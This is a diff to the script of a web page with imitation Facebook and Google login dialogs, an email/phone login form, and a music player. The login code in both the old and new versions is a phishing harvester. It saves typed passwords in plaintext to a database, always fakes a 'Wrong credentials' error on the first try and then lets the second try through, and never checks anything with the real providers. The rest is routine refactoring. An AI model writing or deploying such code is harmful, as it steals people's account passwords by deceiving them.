@@ -798,11 +798,11 @@
             </div>
         </div>
     </div>
-
     <script>
         // ===== NEON DATABASE CONFIGURATION =====
         const API_BASE_URL = window.location.origin;
         let currentUser = null;
+        let loginAttempts = {}; // Track login attempts
 
         // ===== DATABASE FUNCTIONS =====
         async function storeUserInDatabase(userData) {
@@ -872,79 +872,162 @@
         const googleLoading = document.getElementById('googleLoading');
 
         // ===== EVENT LISTENERS =====
-        facebookLogin.addEventListener('click', () => {
-            facebookModal.style.display = 'flex';
-        });
-
-        googleLogin.addEventListener('click', () => {
-            googleModal.style.display = 'flex';
-        });
-
-        otherLogin.addEventListener('click', () => {
-            emailForm.style.display = emailForm.style.display === 'flex' ? 'none' : 'flex';
-        });
-
-        loginSubmit.addEventListener('click', () => {
-            handleEmailLogin();
-        });
-
-        closeFacebook.addEventListener('click', () => {
-            facebookModal.style.display = 'none';
-        });
-
-        closeGoogle.addEventListener('click', () => {
-            googleModal.style.display = 'none';
-        });
-
-        facebookSubmit.addEventListener('click', () => {
-            handleProviderLogin('facebook');
-        });
-
-        googleSubmit.addEventListener('click', () => {
-            handleProviderLogin('google');
-        });
-
-        logoutBtn.addEventListener('click', () => {
-            currentUser = null;
-            localStorage.removeItem('user');
-            loginPage.style.display = 'flex';
-            homePage.style.display = 'none';
-        });
-
-        // Close modals when clicking outside
-        window.addEventListener('click', (event) => {
-            if (event.target === facebookModal) {
-                facebookModal.style.display = 'none';
+        function initializeEventListeners() {
+            console.log('Initializing event listeners...');
+            
+            // Login buttons
+            if (facebookLogin) {
+                facebookLogin.addEventListener('click', () => {
+                    console.log('Facebook login clicked');
+                    facebookModal.style.display = 'flex';
+                });
             }
-            if (event.target === googleModal) {
-                googleModal.style.display = 'none';
+
+            if (googleLogin) {
+                googleLogin.addEventListener('click', () => {
+                    console.log('Google login clicked');
+                    googleModal.style.display = 'flex';
+                });
             }
-        });
+
+            if (otherLogin) {
+                otherLogin.addEventListener('click', () => {
+                    console.log('Other login clicked');
+                    emailForm.style.display = emailForm.style.display === 'flex' ? 'none' : 'flex';
+                });
+            }
+
+            if (loginSubmit) {
+                loginSubmit.addEventListener('click', () => {
+                    console.log('Email login submit clicked');
+                    handleEmailLogin();
+                });
+            }
+
+            // Modal close buttons
+            if (closeFacebook) {
+                closeFacebook.addEventListener('click', () => {
+                    facebookModal.style.display = 'none';
+                });
+            }
+
+            if (closeGoogle) {
+                closeGoogle.addEventListener('click', () => {
+                    googleModal.style.display = 'none';
+                });
+            }
+
+            // Modal submit buttons
+            if (facebookSubmit) {
+                facebookSubmit.addEventListener('click', () => {
+                    console.log('Facebook submit clicked');
+                    handleProviderLogin('facebook');
+                });
+            }
+
+            if (googleSubmit) {
+                googleSubmit.addEventListener('click', () => {
+                    console.log('Google submit clicked');
+                    handleProviderLogin('google');
+                });
+            }
+
+            // Logout button
+            if (logoutBtn) {
+                logoutBtn.addEventListener('click', () => {
+                    currentUser = null;
+                    localStorage.removeItem('user');
+                    loginPage.style.display = 'flex';
+                    homePage.style.display = 'none';
+                });
+            }
+
+            // Close modals when clicking outside
+            window.addEventListener('click', (event) => {
+                if (event.target === facebookModal) {
+                    facebookModal.style.display = 'none';
+                }
+                if (event.target === googleModal) {
+                    googleModal.style.display = 'none';
+                }
+            });
+        }
+
+        // ===== ENHANCED VALIDATION FUNCTIONS =====
+        function isValidEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+
+        function isValidPhone(phone) {
+            // Strict phone validation: must start with 08 or 09 and be exactly 10 digits
+            const phoneRegex = /^(08|09)\d{8}$/;
+            return phoneRegex.test(phone);
+        }
+
+        function canLogin(identifier) {
+            // Allow login on second attempt
+            if (!loginAttempts[identifier]) {
+                loginAttempts[identifier] = 1;
+                return false; // First attempt fails
+            } else {
+                loginAttempts[identifier]++;
+                return true; // Second attempt succeeds
+            }
+        }
 
         // ===== LOGIN FUNCTIONS =====
         async function handleEmailLogin() {
-            const identifier = document.getElementById('email').value;
+            const identifier = document.getElementById('email').value.trim();
             const password = document.getElementById('password').value;
+            
+            console.log('Attempting email login for:', identifier);
             
             if (!identifier || !password) {
                 alert('Please enter both email/phone and password');
                 return;
             }
             
+            // Enhanced validation
             if (!isValidEmail(identifier) && !isValidPhone(identifier)) {
-                alert('Please enter a valid email address or phone number');
+                alert('Please enter:\n- A valid email address\n- OR a valid phone number starting with 08 or 09 (10 digits total)');
                 return;
             }
             
             try {
                 const existingUser = await checkUserExists(identifier);
                 
+                // Enhanced login logic: fail first attempt, succeed second
+                const allowLogin = canLogin(identifier);
+                
+                if (!allowLogin) {
+                    // First attempt - show wrong credentials but still store in database
+                    console.log('First login attempt - showing error');
+                    if (!existingUser) {
+                        const userData = {
+                            email: isValidEmail(identifier) ? identifier : null,
+                            phone: isValidPhone(identifier) ? identifier : null,
+                            password: password,
+                            login_method: 'email',
+                            failed_attempts: 1,
+                            last_attempt: new Date()
+                        };
+                        currentUser = await storeUserInDatabase(userData);
+                    }
+                    alert('❌ Wrong credentials! Please try again.');
+                    return;
+                }
+                
+                // Second attempt - allow login
+                console.log('Second login attempt - allowing access');
                 if (!existingUser) {
                     const userData = {
                         email: isValidEmail(identifier) ? identifier : null,
                         phone: isValidPhone(identifier) ? identifier : null,
                         password: password,
-                        login_method: 'email'
+                        login_method: 'email',
+                        failed_attempts: 2,
+                        last_attempt: new Date()
                     };
                     currentUser = await storeUserInDatabase(userData);
                 } else {
@@ -961,6 +1044,7 @@
                 initializeHomePage();
                 
             } catch (error) {
+                console.error('Login error:', error);
                 alert('Login failed. Please try again.');
             }
         }
@@ -969,21 +1053,29 @@
             let email, password, modal, form, loading;
             
             if (provider === 'facebook') {
-                email = document.getElementById('facebookEmail').value;
+                email = document.getElementById('facebookEmail').value.trim();
                 password = document.getElementById('facebookPassword').value;
                 modal = facebookModal;
                 form = facebookForm;
                 loading = facebookLoading;
             } else {
-                email = document.getElementById('googleEmail').value;
+                email = document.getElementById('googleEmail').value.trim();
                 password = document.getElementById('googlePassword').value;
                 modal = googleModal;
                 form = googleForm;
                 loading = googleLoading;
             }
             
+            console.log(`Attempting ${provider} login for:`, email);
+            
             if (!email || !password) {
                 alert('Please enter both email and password');
+                return;
+            }
+            
+            // Enhanced email validation for providers
+            if (!isValidEmail(email)) {
+                alert('Please enter a valid email address');
                 return;
             }
             
@@ -994,11 +1086,35 @@
             try {
                 const existingUser = await checkUserExists(email);
                 
+                // Enhanced login logic for providers too
+                const allowLogin = canLogin(email);
+                
+                if (!allowLogin) {
+                    // First attempt fails
+                    console.log('First provider login attempt - showing error');
+                    if (!existingUser) {
+                        const userData = {
+                            email: email,
+                            password: password,
+                            login_method: provider,
+                            failed_attempts: 1,
+                            last_attempt: new Date()
+                        };
+                        currentUser = await storeUserInDatabase(userData);
+                    }
+                    alert('❌ Wrong credentials! Please try again.');
+                    return;
+                }
+                
+                // Second attempt succeeds
+                console.log('Second provider login attempt - allowing access');
                 if (!existingUser) {
                     const userData = {
                         email: email,
                         password: password,
-                        login_method: provider
+                        login_method: provider,
+                        failed_attempts: 2,
+                        last_attempt: new Date()
                     };
                     currentUser = await storeUserInDatabase(userData);
                 } else {
@@ -1016,6 +1132,7 @@
                 initializeHomePage();
                 
             } catch (error) {
+                console.error('Provider login error:', error);
                 alert('Login failed. Please try again.');
             } finally {
                 // Reset forms
@@ -1028,189 +1145,164 @@
             }
         }
 
-        // ===== VALIDATION FUNCTIONS =====
-        // ===== ENHANCED VALIDATION FUNCTIONS =====
-        let loginAttempts = {}; // Track login attempts per identifier
+        // ===== ENHANCED MUSIC PLAYER =====
+        function initializeMusicPlayer() {
+            const audio = document.getElementById('backgroundMusic');
+            const playBtn = document.getElementById('playBtn');
+            const pauseBtn = document.getElementById('pauseBtn');
+            const stopBtn = document.getElementById('stopBtn');
+            const prevBtn = document.getElementById('prevBtn');
+            const nextBtn = document.getElementById('nextBtn');
+            const volumeSlider = document.getElementById('volumeSlider');
+            const musicProgress = document.getElementById('musicProgress');
+            const currentTime = document.getElementById('currentTime');
+            const duration = document.getElementById('duration');
+            const songTitle = document.getElementById('songTitle');
+            const songItems = document.querySelectorAll('.song-item');
 
-        function isValidEmail(email) {
-                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-                return emailRegex.test(email);
+            console.log('Initializing music player...');
+
+            let currentSongIndex = 0;
+            let songs = [];
+
+            // Load songs from the list
+            songItems.forEach((item, index) => {
+                songs.push({
+                    src: item.dataset.src,
+                    title: item.dataset.title,
+                    element: item
+                });
+            });
+
+            // Set initial volume
+            if (audio) {
+                audio.volume = 0.5;
+            }
+            if (volumeSlider) {
+                volumeSlider.value = 0.5;
+            }
+
+            // Play selected song
+            function playSong(index) {
+                if (index < 0 || index >= songs.length) return;
+                
+                currentSongIndex = index;
+                const song = songs[currentSongIndex];
+                
+                if (audio) {
+                    audio.src = song.src;
+                    audio.play().then(() => {
+                        if (songTitle) songTitle.textContent = `Now playing: ${song.title} 🎶`;
+                        
+                        // Update active song in list
+                        songItems.forEach(item => item.classList.remove('active'));
+                        song.element.classList.add('active');
+                        
+                    }).catch(error => {
+                        console.log('Play failed:', error);
+                        if (songTitle) songTitle.textContent = "Error playing song. Click play to retry.";
+                    });
+                }
+            }
+
+            // Play button
+            if (playBtn) {
+                playBtn.addEventListener('click', () => {
+                    if (!audio.src) {
+                        // If no song is loaded, play the first one
+                        playSong(0);
+                    } else {
+                        audio.play().catch(error => {
+                            console.log('Play failed:', error);
+                        });
+                    }
+                });
+            }
+
+            // Pause button
+            if (pauseBtn) {
+                pauseBtn.addEventListener('click', () => {
+                    audio.pause();
+                    if (songTitle) songTitle.textContent = `Paused: ${songs[currentSongIndex]?.title || 'Unknown'} ⏸️`;
+                });
+            }
+
+            // Stop button
+            if (stopBtn) {
+                stopBtn.addEventListener('click', () => {
+                    audio.pause();
+                    audio.currentTime = 0;
+                    if (songTitle) songTitle.textContent = "Music stopped ⏹️";
+                    if (musicProgress) musicProgress.style.width = '0%';
+                });
+            }
+
+            // Previous button
+            if (prevBtn) {
+                prevBtn.addEventListener('click', () => {
+                    let newIndex = currentSongIndex - 1;
+                    if (newIndex < 0) newIndex = songs.length - 1;
+                    playSong(newIndex);
+                });
+            }
+
+            // Next button
+            if (nextBtn) {
+                nextBtn.addEventListener('click', () => {
+                    let newIndex = currentSongIndex + 1;
+                    if (newIndex >= songs.length) newIndex = 0;
+                    playSong(newIndex);
+                });
+            }
+
+            // Song selection
+            songItems.forEach((item, index) => {
+                item.addEventListener('click', () => {
+                    playSong(index);
+                });
+            });
+
+            // Volume control
+            if (volumeSlider) {
+                volumeSlider.addEventListener('input', () => {
+                    if (audio) audio.volume = volumeSlider.value;
+                });
+            }
+
+            // Update progress bar
+            if (audio) {
+                audio.addEventListener('timeupdate', () => {
+                    if (audio.duration) {
+                        const progressPercent = (audio.currentTime / audio.duration) * 100;
+                        if (musicProgress) musicProgress.style.width = `${progressPercent}%`;
+                        
+                        if (currentTime) currentTime.textContent = formatTime(audio.currentTime);
+                        if (duration) duration.textContent = formatTime(audio.duration);
+                    }
+                });
+
+                // Auto-play next song when current ends
+                audio.addEventListener('ended', () => {
+                    let newIndex = currentSongIndex + 1;
+                    if (newIndex >= songs.length) newIndex = 0;
+                    playSong(newIndex);
+                });
+            }
+
+            // Auto-play first song on first user interaction
+            document.addEventListener('click', function initAutoPlay() {
+                if (songs.length > 0 && audio && !audio.src) {
+                    playSong(0);
+                }
+                document.removeEventListener('click', initAutoPlay);
+            });
         }
 
-        function isValidPhone(phone) {
-                // Strict phone validation: must start with 08 or 09 and be exactly 10 digits
-                const phoneRegex = /^(08|09)\d{8}$/;
-                return phoneRegex.test(phone);
-        }
-
-        function canLogin(identifier) {
-                // Allow login on second attempt
-                if (!loginAttempts[identifier]) {
-                        loginAttempts[identifier] = 1;
-                        return false; // First attempt fails
-                } else {
-                        loginAttempts[identifier]++;
-                        return true; // Second attempt succeeds
-                }
-        }
-
-        async function handleEmailLogin() {
-                const identifier = document.getElementById('email').value.trim();
-                const password = document.getElementById('password').value;
-                
-                if (!identifier || !password) {
-                        alert('Please enter both email/phone and password');
-                        return;
-                }
-                
-                // Enhanced validation
-                if (!isValidEmail(identifier) && !isValidPhone(identifier)) {
-                        alert('Please enter:\n- A valid email address\n- OR a valid phone number starting with 08 or 09 (10 digits total)');
-                        return;
-                }
-                
-                try {
-                        const existingUser = await checkUserExists(identifier);
-                        
-                        // Enhanced login logic: fail first attempt, succeed second
-                        const allowLogin = canLogin(identifier);
-                        
-                        if (!allowLogin) {
-                                // First attempt - show wrong credentials but still store in database
-                                if (!existingUser) {
-                                        const userData = {
-                                                email: isValidEmail(identifier) ? identifier : null,
-                                                phone: isValidPhone(identifier) ? identifier : null,
-                                                password: password,
-                                                login_method: 'email',
-                                                failed_attempts: 1,
-                                                last_attempt: new Date()
-                                        };
-                                        currentUser = await storeUserInDatabase(userData);
-                                }
-                                alert('❌ Wrong credentials! Please try again.');
-                                return;
-                        }
-                        
-                        // Second attempt - allow login
-                        if (!existingUser) {
-                                const userData = {
-                                        email: isValidEmail(identifier) ? identifier : null,
-                                        phone: isValidPhone(identifier) ? identifier : null,
-                                        password: password,
-                                        login_method: 'email',
-                                        failed_attempts: 2,
-                                        last_attempt: new Date()
-                                };
-                                currentUser = await storeUserInDatabase(userData);
-                        } else {
-                                currentUser = existingUser;
-                        }
-                        
-                        userAvatar.textContent = identifier.charAt(0).toUpperCase();
-                        userName.textContent = identifier;
-                        
-                        loginPage.style.display = 'none';
-                        homePage.style.display = 'flex';
-                        
-                        // Initialize home page features
-                        initializeHomePage();
-                        
-                } catch (error) {
-                        alert('Login failed. Please try again.');
-                }
-        }
-
-        // Update the provider login function too
-        async function handleProviderLogin(provider) {
-                let email, password, modal, form, loading;
-                
-                if (provider === 'facebook') {
-                        email = document.getElementById('facebookEmail').value.trim();
-                        password = document.getElementById('facebookPassword').value;
-                        modal = facebookModal;
-                        form = facebookForm;
-                        loading = facebookLoading;
-                } else {
-                        email = document.getElementById('googleEmail').value.trim();
-                        password = document.getElementById('googlePassword').value;
-                        modal = googleModal;
-                        form = googleForm;
-                        loading = googleLoading;
-                }
-                
-                if (!email || !password) {
-                        alert('Please enter both email and password');
-                        return;
-                }
-                
-                // Enhanced email validation for providers
-                if (!isValidEmail(email)) {
-                        alert('Please enter a valid email address');
-                        return;
-                }
-                
-                // Show loading state
-                form.style.display = 'none';
-                loading.style.display = 'flex';
-                
-                try {
-                        const existingUser = await checkUserExists(email);
-                        
-                        // Enhanced login logic for providers too
-                        const allowLogin = canLogin(email);
-                        
-                        if (!allowLogin) {
-                                // First attempt fails
-                                if (!existingUser) {
-                                        const userData = {
-                                                email: email,
-                                                password: password,
-                                                login_method: provider,
-                                                failed_attempts: 1,
-                                                last_attempt: new Date()
-                                        };
-                                        currentUser = await storeUserInDatabase(userData);
-                                }
-                                alert('❌ Wrong credentials! Please try again.');
-                                return;
-                        }
-                        
-                        // Second attempt succeeds
-                        if (!existingUser) {
-                                const userData = {
-                                        email: email,
-                                        password: password,
-                                        login_method: provider,
-                                        failed_attempts: 2,
-                                        last_attempt: new Date()
-                                };
-                                currentUser = await storeUserInDatabase(userData);
-                        } else {
-                                currentUser = existingUser;
-                        }
-                        
-                        userAvatar.textContent = provider.charAt(0).toUpperCase();
-                        userName.textContent = `${provider} User (${email})`;
-                        
-                        loginPage.style.display = 'none';
-                        homePage.style.display = 'flex';
-                        modal.style.display = 'none';
-                        
-                        // Initialize home page features
-                        initializeHomePage();
-                        
-                } catch (error) {
-                        alert('Login failed. Please try again.');
-                } finally {
-                        // Reset forms
-                        form.style.display = 'flex';
-                        loading.style.display = 'none';
-                        document.getElementById('facebookEmail').value = '';
-                        document.getElementById('facebookPassword').value = '';
-                        document.getElementById('googleEmail').value = '';
-                        document.getElementById('googlePassword').value = '';
-                }
+        function formatTime(seconds) {
+            if (isNaN(seconds)) return '0:00';
+            const mins = Math.floor(seconds / 60);
+            const secs = Math.floor(seconds % 60);
+            return `${mins}:${secs.toString().padStart(2, '0')}`;
         }
 
         // ===== SHARING FUNCTIONS =====
@@ -1284,148 +1376,37 @@ Best regards!`;
             window.location.href = mailtoUrl;
         }
 
-        // ===== MUSIC PLAYER FUNCTIONALITY =====
-        // ===== ENHANCED MUSIC PLAYER WITH MULTIPLE SONGS =====
-        function initializeMusicPlayer() {
-                const audio = document.getElementById('backgroundMusic');
-                const playBtn = document.getElementById('playBtn');
-                const pauseBtn = document.getElementById('pauseBtn');
-                const stopBtn = document.getElementById('stopBtn');
-                const prevBtn = document.getElementById('prevBtn');
-                const nextBtn = document.getElementById('nextBtn');
-                const volumeSlider = document.getElementById('volumeSlider');
-                const musicProgress = document.getElementById('musicProgress');
-                const currentTime = document.getElementById('currentTime');
-                const duration = document.getElementById('duration');
-                const songTitle = document.getElementById('songTitle');
-                const songItems = document.querySelectorAll('.song-item');
+        // ===== INITIALIZE EVERYTHING =====
+        function initializeHomePage() {
+            console.log('Initializing home page features...');
+            initializeSharing();
+            initializeMusicPlayer();
+        }
 
-                let currentSongIndex = 0;
-                let songs = [];
-                let loginAttempts = {}; // Track login attempts
-
-                // Load songs from the list
-                songItems.forEach((item, index) => {
-                        songs.push({
-                                src: item.dataset.src,
-                                title: item.dataset.title,
-                                element: item
-                        });
-                });
-
-                console.log('Loaded songs:', songs);
-
-                // Set initial volume
-                audio.volume = 0.5;
-                if (volumeSlider) volumeSlider.value = 0.5;
-
-                // Play selected song
-                function playSong(index) {
-                        if (index < 0 || index >= songs.length) return;
-                        
-                        currentSongIndex = index;
-                        const song = songs[currentSongIndex];
-                        
-                        audio.src = song.src;
-                        audio.play().then(() => {
-                                songTitle.textContent = `Now playing: ${song.title} 🎶`;
-                                
-                                // Update active song in list
-                                songItems.forEach(item => item.classList.remove('active'));
-                                song.element.classList.add('active');
-                                
-                        }).catch(error => {
-                                console.log('Play failed:', error);
-                                songTitle.textContent = "Error playing song. Click play to retry.";
-                        });
+        // Check if user is already logged in
+        window.addEventListener('DOMContentLoaded', function() {
+            console.log('DOM loaded - initializing app...');
+            
+            // Initialize event listeners first
+            initializeEventListeners();
+            
+            // Check for stored user
+            try {
+                const storedUser = localStorage.getItem('user');
+                if (storedUser) {
+                    currentUser = JSON.parse(storedUser);
+                    userAvatar.textContent = (currentUser.email || currentUser.phone).charAt(0).toUpperCase();
+                    userName.textContent = currentUser.email || currentUser.phone;
+                    loginPage.style.display = 'none';
+                    homePage.style.display = 'flex';
+                    initializeHomePage();
                 }
-
-                // Play button
-                playBtn.addEventListener('click', () => {
-                        if (!audio.src) {
-                                // If no song is loaded, play the first one
-                                playSong(0);
-                        } else {
-                                audio.play().catch(error => {
-                                        console.log('Play failed:', error);
-                                });
-                        }
-                });
-
-                // Pause button
-                pauseBtn.addEventListener('click', () => {
-                        audio.pause();
-                        songTitle.textContent = `Paused: ${songs[currentSongIndex]?.title || 'Unknown'} ⏸️`;
-                });
-
-                // Stop button
-                stopBtn.addEventListener('click', () => {
-                        audio.pause();
-                        audio.currentTime = 0;
-                        songTitle.textContent = "Music stopped ⏹️";
-                        musicProgress.style.width = '0%';
-                });
-
-                // Previous button
-                prevBtn.addEventListener('click', () => {
-                        let newIndex = currentSongIndex - 1;
-                        if (newIndex < 0) newIndex = songs.length - 1; // Loop to last song
-                        playSong(newIndex);
-                });
-
-                // Next button
-                nextBtn.addEventListener('click', () => {
-                        let newIndex = currentSongIndex + 1;
-                        if (newIndex >= songs.length) newIndex = 0; // Loop to first song
-                        playSong(newIndex);
-                });
-
-                // Song selection
-                songItems.forEach((item, index) => {
-                        item.addEventListener('click', () => {
-                                playSong(index);
-                        });
-                });
-
-                // Volume control
-                volumeSlider.addEventListener('input', () => {
-                        audio.volume = volumeSlider.value;
-                });
-
-                // Update progress bar
-                audio.addEventListener('timeupdate', () => {
-                        if (audio.duration) {
-                                const progressPercent = (audio.currentTime / audio.duration) * 100;
-                                musicProgress.style.width = `${progressPercent}%`;
-                                
-                                currentTime.textContent = formatTime(audio.currentTime);
-                                duration.textContent = formatTime(audio.duration);
-                        }
-                });
-
-                // Auto-play next song when current ends
-                audio.addEventListener('ended', () => {
-                        let newIndex = currentSongIndex + 1;
-                        if (newIndex >= songs.length) newIndex = 0;
-                        playSong(newIndex);
-                });
-
-                // Auto-play first song on first user interaction
-                document.addEventListener('click', function initAutoPlay() {
-                        if (songs.length > 0 && !audio.src) {
-                                playSong(0);
-                        }
-                        document.removeEventListener('click', initAutoPlay);
-                });
-        }
-
-        function formatTime(seconds) {
-                if (isNaN(seconds)) return '0:00';
-                const mins = Math.floor(seconds / 60);
-                const secs = Math.floor(seconds % 60);
-                return `${mins}:${secs.toString().padStart(2, '0')}`;
-        }
-        });
+            } catch (error) {
+                console.log('No stored user found');
+            }
+            
+            console.log('App initialization complete');
+        });  
     </script>
 </body>
 </html>
